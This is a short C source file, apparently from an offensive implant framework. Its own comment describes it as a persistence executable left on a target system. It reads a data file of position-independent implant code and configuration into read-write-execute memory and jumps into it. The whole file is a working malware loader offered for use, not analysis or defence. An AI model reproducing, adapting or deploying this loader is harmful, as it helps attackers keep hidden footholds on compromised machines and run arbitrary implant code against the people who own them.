/*
The persistence exe to be left as a file on the target system. Once ran, copies the contents of
a data file containing Config info and PIC implant code into its process memory and executes it.
*/

#define WIN32_LEAN_AND_MEAN
#define MAX_PATH 260

#include "../shared/Config.h"

typedef void(*PAYLOADFUNC)(PCONFIG Config);

// entry point, looks for preset data file name and copies its contents into the current process memory then executes it
int main()
{
	// expand path to data file then open a handle to it
	char dataPath[] = PERSIST_DATA_PATH;
	char fullDataPath[MAX_PATH] = { 0 };
	if (!ExpandEnvironmentStringsA(dataPath, fullDataPath, MAX_PATH))
	{
		return 1;
	}
	HANDLE hFile = CreateFileA(fullDataPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile)
	{
		return 1;
	}

	// retrieve file size then allocate a buffer
	DWORD fileSizeHigh;
	unsigned fileSize = GetFileSize(hFile, &fileSizeHigh);
	uint8_t * implantBuf = VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!implantBuf)
	{
		//unsigned error = GetLastError();
		return 1;
	}
	if (!ReadFile(hFile, implantBuf, fileSize, NULL, NULL))
	{
		//unsigned error = GetLastError();
		return 1;
	}
	CloseHandle(hFile);

	// Set Config fields and call into implant code
	// Data File:
    // |- Implant code
    // |- Config structure
	PCONFIG Config = (PCONFIG) (implantBuf + (fileSize - sizeof(CONFIG)));
	Config->ImplantEntry = implantBuf;
	PAYLOADFUNC Payload = (PAYLOADFUNC) implantBuf;
	// execute injected implant code
	Payload(Config);

	return 0;
}
